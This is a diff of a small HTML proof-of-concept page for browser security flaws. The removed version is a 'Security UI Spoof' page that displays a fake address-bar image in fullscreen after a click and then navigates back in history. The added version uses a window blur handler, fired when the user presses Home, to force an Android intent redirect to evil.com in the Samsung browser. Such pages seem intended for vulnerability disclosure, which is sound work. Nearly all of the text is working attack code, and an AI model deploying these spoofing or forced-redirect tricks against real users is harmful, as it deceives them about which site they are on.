@@ -1,36 +1,20 @@
+<html>
 
-<!DOCTYPE html>
-<html lang="en">
-    <head>
-        <title>Security UI Spoof</title>
-        <style>
-            body {
-                margin: 0;
-                padding: 0;
-            }         
-            #spoof {
-                width:  100%;
-                height: 100%;
-            }
-        </style>
-        <script>
-            onclick = async () => {
-             
-                setTimeout(function(){
-                document.getElementById("spoof").style   = "display: block;";
-                document.getElementById("content").style = "display: none;";document.documentElement.requestFullscreen();}, 1500);
-                setTimeout('history.go(-2)', 3500);
-            }
-        </script>
-    </head>  
-    <body>
-        <img id="spoof" style="display: none;" src="https://lbherrera.github.io/lab/chrome/contacts-spoof-233217/spoof.png"></img>
-        <div id="content">
-            <br><br><br>
-            <center>
-                <h1>Click anywhere on the page to spoof the omnibox!</h1>
-            </center>
-        </div>
-    </body>
-  </body>
+<body>
+
+<script>
+
+window.onblur=function incognito() {
+
+
+location.replace('intent://evil.com#Intent;scheme=https;package=com.sec.android.app.sbrowser;end');
+
+
+}
+
+</script>
+
+<h1> CLICK HOME icon FOR POC </h1>
+
+</body>
 </html>
